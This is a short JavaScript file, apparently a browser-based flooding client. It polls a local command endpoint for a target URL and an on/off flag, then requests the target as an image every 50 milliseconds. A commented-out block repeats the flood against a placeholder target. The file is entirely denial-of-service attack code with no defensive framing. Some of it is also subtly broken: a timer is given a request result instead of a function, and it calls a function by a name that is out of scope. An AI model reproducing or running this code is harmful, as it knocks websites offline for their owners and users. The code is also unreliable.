setInterval($.ajax({
    url: "http://127.0.0.1:3000/api",
    type: "GET",
    contentType: 'application/json; charset=utf-8',
    success: function(resp) {
        function flood(){
        	var img = new Image();
			img.src = resp.body.target;
			img.onload;
        }
       	if(resp.body.status == 1){
       		var floodInterval = setInterval('flood()',50);
		} else {
			var floodInterval = setInterval('flood()',9999999999999);
			clearInterval(floodInterval);
		}
    },
    error : function(jqXHR, textStatus, errorThrown) {},
    timeout: 120000,
    }),
    1000);

/*
function main() {
    var img = new Image();
    img.src = 'http://target/page.html';
    img.onload;
}
var floodInterval = setInterval('flood()',50);
*/